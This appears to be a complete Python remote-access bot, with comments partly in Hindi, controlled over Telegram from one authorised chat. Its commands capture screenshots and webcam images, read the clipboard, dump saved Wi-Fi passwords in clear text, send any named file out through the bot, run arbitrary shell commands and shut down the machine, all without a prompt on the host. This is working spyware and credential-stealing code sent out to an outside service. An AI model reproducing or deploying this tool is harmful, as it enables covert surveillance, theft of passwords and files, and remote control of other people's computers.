import os
import re
import mss
import cv2
import time
import shutil
import telebot
import platform
import subprocess
import threading
import requests
import pyperclip
import pygame # Audio play karne ke liye (No popup)
from gtts import gTTS
from pathlib import Path
from functools import wraps
from tempfile import NamedTemporaryFile
from dotenv import load_dotenv

load_dotenv()

# ==============================
# CONFIGURATION
# ==============================

TOKEN = os.getenv("TOKEN")
ALLOWED_CHAT_ID = int(os.getenv("CHAT_ID"))  # Sirf yahi Chat ID access kar sakta hai

bot = telebot.TeleBot(TOKEN)
OS = platform.system()  # 'Windows', 'Linux', 'Darwin'
cd = Path.home()

user_states = {}

STATE_NORMAL = 1
STATE_SHELL = 2

# ==============================
# HELPERS
# ==============================

def is_authorized(chat_id):
    """Check karo ki message allowed Chat ID se aa raha hai ya nahi."""
    return chat_id == ALLOWED_CHAT_ID


def authorize_required(func):
    """Decorator: sirf allowed Chat ID ko access deta hai."""
    @wraps(func)
    def wrapper(message, *args, **kwargs):
        if not is_authorized(message.chat.id):
            # Unauthorized users ko koi response nahi — silently ignore
            return
        return func(message, *args, **kwargs)
    return wrapper


def send_long_message(chat_id, text):
    chunk_size = 4000
    for i in range(0, len(text), chunk_size):
        bot.send_message(chat_id, text[i:i + chunk_size])


def secure_delete_fallback(path: Path, passes=2):
    try:
        if not path.exists() or not path.is_file():
            return False
        length = path.stat().st_size
        with open(path, "r+b") as f:
            for _ in range(passes):
                f.seek(0)
                f.write(os.urandom(length))
                f.flush()
                os.fsync(f.fileno())
        path.unlink()
        return True
    except Exception:
        try:
            path.unlink()
        except:
            return False
    return True


# ==============================
# SYSTEM FUNCTIONS
# ==============================

def get_public_ip():
    try:
        r = requests.get("https://api.ipify.org")
        return r.text.strip()
    except:
        return "Error retrieving IP."


def get_system_info():
    info = {
        "OS": platform.system(),
        "Version": platform.version(),
        "Release": platform.release(),
        "Machine": platform.machine(),
        "Processor": platform.processor(),
        "CPU cores": os.cpu_count(),
        "Username": os.getenv("USER") or os.getenv("USERNAME"),
    }
    return "\n".join(f"{k}: {v}" for k, v in info.items())


def take_screenshot(path: Path):
    with mss.mss() as sct:
        sct.shot(output=str(path))
    return path


def capture_webcam_image(path: Path):
    cap = cv2.VideoCapture(0)
    if not cap.isOpened():
        return None
    ret, frame = cap.read()
    cap.release()
    if ret:
        cv2.imwrite(str(path), frame)
        return path
    return None


def lock_screen():
    try:
        if OS == "Windows":
            subprocess.run(["rundll32.exe", "user32.dll,LockWorkStation"])
        elif OS == "Darwin":
            subprocess.run(["/System/Library/CoreServices/Menu Extras/User.menu/Contents/Resources/CGSession", "-suspend"])
        elif OS == "Linux":
            if shutil.which("loginctl"):
                subprocess.run(["loginctl", "lock-session"])
            elif shutil.which("gnome-screensaver-command"):
                subprocess.run(["gnome-screensaver-command", "-l"])
            else:
                return False
        return True
    except Exception:
        return False


def shutdown_computer():
    try:
        if OS == "Windows":
            subprocess.run(["shutdown", "/s", "/t", "5"])
        elif OS == "Linux":
            subprocess.run(["systemctl", "poweroff"])
        elif OS == "Darwin":
            subprocess.run(["osascript", "-e", 'tell app "System Events" to shut down'])
        return True
    except Exception:
        return False


def get_clipboard_content():
    try:
        return pyperclip.paste()
    except:
        return None


def play_text(text, lang="en"):
    try:
        tts = gTTS(text=text, lang=lang)
        with NamedTemporaryFile(suffix=".mp3", delete=False) as tmp:
            tts.write_to_fp(tmp)
            tmp_path = tmp.name

        pygame.mixer.init()
        pygame.mixer.music.load(tmp_path)
        pygame.mixer.music.play()

        while pygame.mixer.music.get_busy():
            time.sleep(0.1)

        pygame.mixer.music.unload()
        if os.path.exists(tmp_path):
            os.remove(tmp_path)

    except Exception as e:
        print(f"Speech Error: {e}")


def get_wifi_passwords():
    profiles = []
    try:
        if OS == "Windows":
            export_folder = Path.home() / "wifi_profiles"
            export_folder.mkdir(exist_ok=True)
            subprocess.run(["netsh", "wlan", "export", "profile", "key=clear", f"folder={export_folder}"], shell=True)
            for file in export_folder.glob("*.xml"):
                xml_content = file.read_text(errors="ignore")
                ssid = re.search(r"<name>(.*?)</name>", xml_content)
                key = re.search(r"<keyMaterial>(.*?)</keyMaterial>", xml_content)
                if ssid:
                    profiles.append(f"SSID: {ssid.group(1)} | PASS: {key.group(1) if key else 'N/A'}")
            shutil.rmtree(export_folder)
        elif OS == "Darwin":
            result = subprocess.run(["security", "find-generic-password", "-ga", "Wi-Fi"], capture_output=True, text=True)
            profiles.append(result.stdout)
        elif OS == "Linux":
            result = subprocess.run(["nmcli", "-t", "-f", "NAME,SECURITY", "connection", "show"], capture_output=True, text=True)
            profiles.append(result.stdout)
    except Exception as e:
        profiles.append(f"Error: {e}")
    return "\n".join(profiles) if profiles else "No Wi-Fi profiles found or permission denied."


# ==============================
# BOT COMMANDS
# ==============================

@bot.message_handler(commands=["start"])
@authorize_required
def start(message):
    bot.send_message(
        message.chat.id,
        "✅ Connected! Your Chat ID verified.\n\n"
        "Commands:\n"
        "/screen - screenshot\n"
        "/webcam - capture webcam\n"
        "/sys - system info\n"
        "/ip - public IP\n"
        "/cd [dir] - change folder\n"
        "/ls - list files\n"
        "/upload [path] - get file\n"
        "/clipboard - get clipboard\n"
        "/speech [hi/en] [text] - play speech\n"
        "/wifi - get Wi-Fi info\n"
        "/lock - lock PC\n"
        "/shutdown - shutdown PC\n"
        "/shell - open remote shell"
    )


@bot.message_handler(commands=["screen"])
@authorize_required
def screenshot_cmd(message):
    path = cd / "screenshot.png"
    take_screenshot(path)
    with open(path, "rb") as f:
        bot.send_photo(message.chat.id, f)
    path.unlink(missing_ok=True)


@bot.message_handler(commands=["sys"])
@authorize_required
def sys_info_cmd(message):
    bot.send_message(message.chat.id, get_system_info())


@bot.message_handler(commands=["ip"])
@authorize_required
def ip_cmd(message):
    bot.send_message(message.chat.id, get_public_ip())


@bot.message_handler(commands=["ls"])
@authorize_required
def list_dir_cmd(message):
    try:
        contents = [p.name for p in cd.iterdir()]
        bot.send_message(message.chat.id, "\n".join(contents) or "Empty folder.")
    except Exception as e:
        bot.send_message(message.chat.id, f"Error: {e}")


@bot.message_handler(commands=["cd"])
@authorize_required
def cd_cmd(message):
    global cd
    args = message.text.split(maxsplit=1)
    if len(args) < 2:
        bot.send_message(message.chat.id, f"Current dir: {cd}")
        return
    new_path = (cd / args[1]).resolve()
    if new_path.is_dir():
        cd = new_path
        bot.send_message(message.chat.id, f"Changed to: {cd}")
    else:
        bot.send_message(message.chat.id, "Folder not found.")


@bot.message_handler(commands=["upload"])
@authorize_required
def upload_cmd(message):
    args = message.text.split(maxsplit=1)
    if len(args) < 2:
        bot.send_message(message.chat.id, "Usage: /upload [path]")
        return
    path = Path(args[1])
    if path.exists() and path.is_file():
        with open(path, "rb") as f:
            bot.send_document(message.chat.id, f)
    else:
        bot.send_message(message.chat.id, "File not found.")


@bot.message_handler(commands=["clipboard"])
@authorize_required
def clipboard_cmd(message):
    clip = get_clipboard_content()
    bot.send_message(message.chat.id, clip or "Clipboard empty or unsupported.")


@bot.message_handler(commands=["speech"])
@authorize_required
def speech_cmd(message):
    args = message.text.split(maxsplit=2)

    if len(args) < 2:
        bot.send_message(message.chat.id, "Usage: /speech [hi/en] [text]\nExample: /speech hi Namaste")
        return

    if args[1].lower() in ["hi", "en"]:
        lang = args[1].lower()
        text = args[2] if len(args) > 2 else ""
    else:
        lang = "en"
        text = " ".join(args[1:])

    if not text:
        bot.send_message(message.chat.id, "Bolne ke liye kuch likhein.")
        return

    threading.Thread(target=play_text, args=(text, lang), daemon=True).start()
    bot.send_message(message.chat.id, f"🔊 {lang.upper()} mein bol raha hoon...")


@bot.message_handler(commands=["lock"])
@authorize_required
def lock_cmd(message):
    if lock_screen():
        bot.send_message(message.chat.id, "🔒 Screen locked.")
    else:
        bot.send_message(message.chat.id, "❌ Lock not supported on this OS.")


@bot.message_handler(commands=["shutdown"])
@authorize_required
def shutdown_cmd(message):
    if shutdown_computer():
        bot.send_message(message.chat.id, "💻 Shutting down...")
    else:
        bot.send_message(message.chat.id, "❌ Shutdown failed or unsupported.")


@bot.message_handler(commands=["webcam"])
@authorize_required
def webcam_cmd(message):
    img = cd / "webcam.jpg"
    result = capture_webcam_image(img)
    if result:
        with open(result, "rb") as f:
            bot.send_photo(message.chat.id, f)
        img.unlink(missing_ok=True)
    else:
        bot.send_message(message.chat.id, "Camera not found.")


@bot.message_handler(commands=["wifi"])
@authorize_required
def wifi_cmd(message):
    bot.send_message(message.chat.id, get_wifi_passwords())


@bot.message_handler(commands=["shell"])
@authorize_required
def shell_cmd(message):
    user_states[message.from_user.id] = STATE_SHELL
    bot.send_message(message.chat.id, "Shell mode active. Type 'exit' to quit.")


def get_user_state(uid):
    return user_states.get(uid, STATE_NORMAL)


@bot.message_handler(func=lambda msg: get_user_state(msg.from_user.id) == STATE_SHELL)
@authorize_required
def shell_input(message):
    uid = message.from_user.id
    chat_id = message.chat.id
    cmd = message.text.strip()
    if cmd.lower() == "exit":
        user_states[uid] = STATE_NORMAL
        bot.send_message(chat_id, "Exited shell mode.")
        return

    def run_cmd():
        try:
            proc = subprocess.Popen(
                cmd, shell=True,
                stdout=subprocess.PIPE, stderr=subprocess.PIPE
            )
            try:
                out, err = proc.communicate(timeout=30)
            except subprocess.TimeoutExpired:
                proc.kill()
                out, err = proc.communicate()
                bot.send_message(chat_id, "⚠️ Command timed out after 30s.")
                return
            text = (out or b"").decode(errors="ignore") + (err or b"").decode(errors="ignore")
            send_long_message(chat_id, text or "[No output]")
        except Exception as e:
            bot.send_message(chat_id, f"Error: {e}")

    threading.Thread(target=run_cmd, daemon=True).start()


# ==============================
# MAIN LOOP
# ==============================

if __name__ == "__main__":
    print(f"Bot running on {OS} ...")
    print(f"Authorized Chat ID: {ALLOWED_CHAT_ID}")
    while True:
        try:
            bot.infinity_polling()
        except Exception as e:
            print(f"Error: {e}")
            time.sleep(5)